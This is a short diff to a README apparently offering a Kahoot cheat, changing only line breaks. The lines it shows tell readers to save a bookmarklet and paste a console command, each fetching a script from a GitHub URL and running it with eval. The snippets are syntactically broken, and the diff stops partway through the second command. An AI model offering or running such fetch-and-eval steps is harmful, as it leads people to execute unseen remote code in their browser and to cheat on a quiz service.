@@ -8,10 +8,10 @@
 <h1 text align = "center"> H@ck </h1>
 
 </br></br>
-1. Add this to your bookmarks
-`javascript:fetch("https://raw.githubusercontent.com/1hipo1/yes/main/yesyes.js" <br>
-  .then((r) => r.text() <br>
-  .then((t) => eval(t)));` <br>
+1. Add this to your bookmarks </br>
+`javascript:fetch("https://raw.githubusercontent.com/1hipo1/yes/main/yesyes.js" 
+  .then((r) => r.text() 
+  .then((t) => eval(t)));` 
    
 2. Paste this into console
 `fetch("https://raw.githubusercontent.com/DYLOjestem/Cheats/main/kahoot.js") 
